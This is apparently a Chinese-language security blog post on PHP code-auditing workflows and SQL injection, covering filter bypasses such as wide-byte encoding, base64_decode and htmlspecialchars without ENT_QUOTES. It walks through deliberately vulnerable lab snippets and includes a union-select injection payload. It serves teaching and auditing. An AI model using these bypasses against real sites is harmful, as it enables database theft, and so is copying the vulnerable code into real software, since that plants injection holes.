    <published>2021-10-17T04:30:26.000Z</published>
    <updated>2021-10-21T02:46:21.673Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-代码审计流程"><a href="#0x01-代码审计流程" class="headerlink" title="0x01 代码审计流程"></a>0x01 代码审计流程</h2><h3 id="反向查找流程"><a href="#反向查找流程" class="headerlink" title="反向查找流程"></a>反向查找流程</h3><p>​    通过可控变量(输入点)回溯危险函数</p><p>​    查找危险函数确定可控变量</p><p>​    传递的过程中触发漏洞</p><p>案例</p><p>​    <a href="https://bugs.leavesongs.com/php/z-blog-blind-xxe%E9%80%A0%E6%88%90%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">Z-BLOG Blind-XXE造成任意文件读取 </a></p><p>反向查找流程特点</p><p>​    上下文无关</p><p>​    危险函数，调用即漏洞</p><p>使用反向查找流程挖掘漏洞</p><p>​    危险函数全局查找</p><p>​    自动化审计工具(RISP、VCG、Fortify SCA、Cobra、grepbugs、Sky wolf、Taint)</p><p>根源：危险函数导致漏洞</p><p>特点：</p><p>​    brute：全局搜索危险函数</p><p>​    simple：无须过多理解目标网站功能与架构</p><p>​    fast：适用于自动化代码审计工具</p><p>​    命中率低：逻辑漏洞多数不存在危险函数，或危险函数的参数”看似“不可控</p><p>​    适应性交叉：不适合存在全局过滤的站点</p><h3 id="正向查找流程-MVC架构-Model-View-Controller-Controller主要分发处理请求逻辑，Model专门处理数据库相关操作，View显示给用户的一些内容"><a href="#正向查找流程-MVC架构-Model-View-Controller-Controller主要分发处理请求逻辑，Model专门处理数据库相关操作，View显示给用户的一些内容" class="headerlink" title="正向查找流程(MVC架构 Model View Controller) Controller主要分发处理请求逻辑，Model专门处理数据库相关操作，View显示给用户的一些内容"></a>正向查找流程(MVC架构 Model View Controller) Controller主要分发处理请求逻辑，Model专门处理数据库相关操作，View显示给用户的一些内容</h3><p>流程：</p><p>​    从入口函数出发</p><p>​    找到控制器，理解URL派发规则</p><p>​    跟踪控制器调用，以理解代码为目标</p><p>​    阅读代码的过程中，可能发现漏洞</p><p>案例</p><p>​    PHPCMS v9.6.0前台GetShell漏洞</p><p>根源：程序员疏忽或逻辑问题导致漏洞</p><p>特点：</p><p>​    复杂：需要及其了解目标源码的功能与架构</p><p>​    跳跃性大：设计M/V/C/Service/Dao等多个层面</p><p>​    漏洞的组和：通常是多个漏洞的组和，很可能存在逻辑相关的漏洞</p><p>​    潜力无限：安全研究人员的爆库</p><h3 id="双向查找流程"><a href="#双向查找流程" class="headerlink" title="双向查找流程"></a>双向查找流程</h3><p>阅读代码，了解架构</p><p>是否有全局过滤机制</p><p>​    有：是否可以绕过</p><p>​        可以：寻找漏洞触发点</p><p>​        不可以：寻找没有过滤的变量</p><p>​    没有：那么他是如何处理的</p><p>​        完全没有处理：可以挖成筛子</p><p>​        有处理：寻找遗漏的处理点</p><p>找到了漏洞点，漏洞利用是否有坑</p><p>​    否：成功利用</p><p>​    是：利用所知的语言知识(trick)解决问题</p><p><img src="https://z3.ax1x.com/2021/10/17/5YcTJK.png"></p><h2 id="PHP-SQL注入漏洞挖掘技巧"><a href="#PHP-SQL注入漏洞挖掘技巧" class="headerlink" title="PHP-SQL注入漏洞挖掘技巧"></a>PHP-SQL注入漏洞挖掘技巧</h2><p>PHP+Mysql连接方法</p><p>​    Mysql(废弃)</p><p>​    Mysqli</p><p>​    PDO</p><p>SQL注入漏洞常见过滤方法</p><pre class="line-numbers language-none"><code class="language-none">-- intval / addslashes /mysql_real_escape-- mysqli_escape_string / mysqli_real_escape_string / mysqli::escape_string-- PDO::qoute-- 参数化查询<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="addslashes-mysql-real-escape"><a href="#addslashes-mysql-real-escape" class="headerlink" title="addslashes / mysql_real_escape"></a>addslashes / mysql_real_escape</h3><p>宽字符注入</p><p>寻找字符串转换函数</p><p>​    urldecode</p><p>​    base64_decode</p><p>​    iconv</p><p>​    json_decode</p><p>​    stripshasles</p><p>​    simple_xml_loadstring</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ' ==&gt; \'</span><span class="token comment">// \ ==&gt; \\</span><span class="token comment">// " ==&gt; \"</span><span class="token comment">// \x00 ==&gt; \0</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT * FROM dual WHERE id '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mysqli-escape-string-PDO-qoute"><a href="#mysqli-escape-string-PDO-qoute" class="headerlink" title="mysqli::escape_string / PDO::qoute"></a>mysqli::escape_string / PDO::qoute</h3><p>​    与addslashes差别：是否会主动加引号包裹</p><p>​    宽字节注入</p><h3 id="参数化查询"><a href="#参数化查询" class="headerlink" title="参数化查询"></a>参数化查询</h3><p>​    寻找非sql值的位置</p><p>​    SELECT name from users where id =？ ORDER BY Login_time LImit 1</p><p>案例：贷齐乐系统header注入</p><p>略读代码，了解架构</p><p>​    非MVC架构</p><p>​    全局GPC转义</p><p>目标：找到没有进行过滤的输入点</p><p>结果：$_SERVER[HTTP _*]均无过滤导致注入</p><p>入手点</p><p>​    开发者不熟悉的边缘功能</p><p>​    常被复杂粘贴代码的功能</p><p>案例：ThinkSNS某版本SQL注入漏洞</p><p>略读代码，了解架构</p><p>​    基于ThinkPHP3.1开发</p><p>​    MVC架构</p><p>​    利用t函数过滤变量</p><p>目标：找到t函数过滤完成以后也可以注入的点</p><p>结果：表名位置SQL注入漏洞</p><p>案例：Metinfo企业网站管理系统SQL注入漏洞</p><p>漏洞代码，了解架构</p><p>​    非MVC架构</p><p>​    全局覆盖的方式注册变量</p><p>​    全局GPC转义</p><p>目标：获取绕过全局GPC的方法</p><p>结果：利用base64_decode来引入单引号</p><h2 id="0x03-上方部分总结"><a href="#0x03-上方部分总结" class="headerlink" title="0x03 上方部分总结"></a>0x03 上方部分总结</h2><p>开发者容易遗漏的输入点</p><p>HTTP头</p><p>​    X-Forwarded-For</p><p>​    User-Agent</p><p>​    Referer</p><p>PHP_SELF</p><p>REQUEST_URL</p><p>文件名$_FILES[] [name]</p><p>php://input</p><p>引入单引号(转义符)的方法</p><p>​    stripslashes</p><p>​    base64_decode</p><p>​    urldecode</p><p>​    substr</p><p>​    iconv</p><p>​    str_replace(‘0’,’’,$sql)</p><p>​    xml</p><p>​    json_encode</p><h2 id="0x04-简单分析SQL注入的诱因"><a href="#0x04-简单分析SQL注入的诱因" class="headerlink" title="0x04 简单分析SQL注入的诱因"></a>0x04 简单分析SQL注入的诱因</h2><h3 id="1-前沿配置"><a href="#1-前沿配置" class="headerlink" title="1 前沿配置"></a>1 前沿配置</h3><p>我的conn.php中配置</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$mysql_server</span><span class="token operator">=</span><span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$mysql_username</span><span class="token operator">=</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$mysql_password</span><span class="token operator">=</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$mysql_database</span><span class="token operator">=</span><span class="token double-quoted-string string">"test"</span><span class="token punctuation">;</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$mysql_server</span><span class="token punctuation">,</span><span class="token variable">$mysql_username</span><span class="token punctuation">,</span><span class="token variable">$mysql_password</span><span class="token punctuation">,</span><span class="token variable">$mysql_password</span><span class="token punctuation">,</span><span class="token variable">$mysql_database</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span>数据库连接错误<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mysql表中的值</p><p><img src="https://z3.ax1x.com/2021/10/17/5tPVFs.png"></p><h3 id="2-第一个SQL代码分析"><a href="#2-第一个SQL代码分析" class="headerlink" title="2 第一个SQL代码分析"></a>2 第一个SQL代码分析</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?phpinclude_once('./common.php');try{$name = $_GET['name'];$query = "SELECT name, age, email, country FROM user_details where name = '{$name}';";$stmt = $conn-&gt;prepare($query); // stmt = PDOStatement预处理状态$stmt-&gt;execute();$stmt-&gt;bind_result($name, $age, $email, $country);while ($stmt-&gt;fetch()){echo "$email"."&lt;br&gt;";}} catch (PDOException $e) {echo $e-&gt;getMessage();}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题明显没有任何过滤，并且是最基础的sql注入漏洞直接联合查询就可以搞过</p><pre class="line-numbers language-none"><code class="language-none">?name=二号%27%20union%20select%201,2,(user()),4%20%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-第二个SQL代码分析"><a href="#3-第二个SQL代码分析" class="headerlink" title="3 第二个SQL代码分析"></a>3 第二个SQL代码分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SET NAMES gbk;SELECT name, age, email, country FROM user_details where name = '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$name</span><span class="token punctuation">}</span></span>';"</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">,</span> <span class="token variable">$country</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$email</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>addslashes将引号转义成\后加引号，找不到注入点</p><h3 id="4-第三个SQL代码分析"><a href="#4-第三个SQL代码分析" class="headerlink" title="4 第三个SQL代码分析"></a>4 第三个SQL代码分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT name, age, email, country FROM user_details where name = '<span class="token interpolation"><span class="token variable">$name</span></span>';"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>       <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// stmt = PDOStatement  预处理状态</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$email</span><span class="token punctuation">,</span><span class="token variable">$country</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$email</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>htmlspecialchars是将特殊符号转换为html实体编码，处理xss漏洞的一个防御函数</p><img src="https://z3.ax1x.com/2021/10/17/5tgbPx.png" alt="htmlspecialchars" style="zoom:67%;"><p>开发者因为没有足够理解这个函数的关于单引号的触发机制导致漏洞，因为必须得设置ENT_QUOTES参数设置后才能转单引号，所以可以直接sql注入，这里#要写进去得写成%23</p><p><img src="https://z3.ax1x.com/2021/10/17/5t2dF1.png"></p><h3 id="5-第四个SQL代码分析"><a href="#5-第四个SQL代码分析" class="headerlink" title="5 第四个SQL代码分析"></a>5 第四个SQL代码分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT name, age, email, country FROM user_details where age &gt; <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$age</span><span class="token punctuation">}</span></span>;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">,</span> <span class="token variable">$country</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$email</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显查询语句是数字比较，忽略的单引号闭合，所以不需要单引号逃逸，所以这题也存在盲注和联合查询注入，addslashes相当于无用了</p><p><img src="https://z3.ax1x.com/2021/10/17/5t4vsf.png"></p><h3 id="6-第五个SQL注入分析"><a href="#6-第五个SQL注入分析" class="headerlink" title="6 第五个SQL注入分析"></a>6 第五个SQL注入分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"'"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"\\'"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT name, age, email, country FROM user_details where name = '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$name</span><span class="token punctuation">}</span></span>';"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">,</span> <span class="token variable">$country</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$email</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和addslashes差不多的意思，str_replace函数是将字符串的替换，将单引号替换成\加上单引号。但是和addslashes也有很大的区别，因为它会将\也变成双\，但是str_replace就只会变换一次</p><p><img src="https://z3.ax1x.com/2021/10/18/5NQDC6.png"></p><h3 id="7-第六个SQL注入代码分析"><a href="#7-第六个SQL注入代码分析" class="headerlink" title="7 第六个SQL注入代码分析"></a>7 第六个SQL注入代码分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT name, age, email, country FROM user_details where id = '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$id</span><span class="token punctuation">}</span></span>';"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">,</span> <span class="token variable">$country</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$email</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>intval会将其中的字符串给去掉，没有发现能够注入的点</p><h3 id="8-第七个SQL注入代码分析"><a href="#8-第七个SQL注入代码分析" class="headerlink" title="8 第七个SQL注入代码分析"></a>8 第七个SQL注入代码分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT name, age, email, country FROM user_details where id = <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>;"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">,</span> <span class="token variable">$country</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$email</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" 